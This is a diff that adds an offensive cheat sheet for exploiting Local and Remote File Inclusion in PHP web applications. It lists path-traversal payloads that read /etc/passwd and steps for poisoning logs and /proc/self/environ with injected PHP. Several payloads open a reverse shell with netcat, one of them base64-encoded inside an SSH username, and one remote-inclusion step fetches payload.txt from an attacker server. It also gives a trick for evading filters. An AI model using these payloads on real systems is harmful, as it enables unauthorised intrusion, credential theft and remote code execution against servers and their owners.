@@ -1,0 +1,63 @@
+Local File Inclusion
+
+	Detection in cookies
+		Request
+		GET /vulnerable.php HTTP/1.1
+		Cookie:usid=../../../../../../../../../../etc/passwd%00
+
+		Response
+		HTTP/1.1 200 OK 
+		...
+		Server: Apache root:fi3sER6:0:1:System Operator:/:/bin/ksh//
+
+	path migration
+		end path in %00 to terminate the request 
+			used if code uses include($page . '.php');
+
+	inject code to readable files (log and environment)
+		e.g. /proc/self/environ
+			/var/log/auth.log
+			/var/log/apache2/access.log
+			
+		environment variable
+			find file using path migration (e.g. ?page=../../../../proc/self) and find environment variable to alter (e.g. HTTP_USER_AGENT)
+
+			use proxy to modify variable content with php (e.g. <?phpinfo();?>) to test vuln
+
+			set up listener
+
+			use proxy to inject
+				<?passthru("nc -e /bin/sh <LHOST> <LPORT>");?>
+
+		log
+			find log file using path migration (e.g. ?page=../../../../var/log/auth.log)
+
+			try to ssh into target server
+
+			show log and search for attacker username
+
+			encode this in b64:
+				nc -e /bin/sh <LHOST> <LPORT>
+			
+			try to ssh in using:
+				ssh "<?passthru(base64_decode('b64_block'));?>"@<target_ip>
+
+			reload log file to execute code
+
+Remote File Inclusion
+
+	if allow_url_fopen and allow_url_include are enabled in the /etc/php5/cgi/php.ini
+
+	create file on acessible web platform (needs routable IP) containing:
+		<?passthru("nc -e /bin/sh <LHOST> <LPORT>");?>
+	save as payload.txt file (so it executes on remote target not local machine) in /var/www/html
+
+	set up listener
+
+	replace ?page=include.php with 
+	?page=http://attack_server/payload.txt
+
+	NOTE: may need ? on end to get it to execute as PHP
+
+	may have to circumvent filtering of "http"
+		try "hTTp", ...
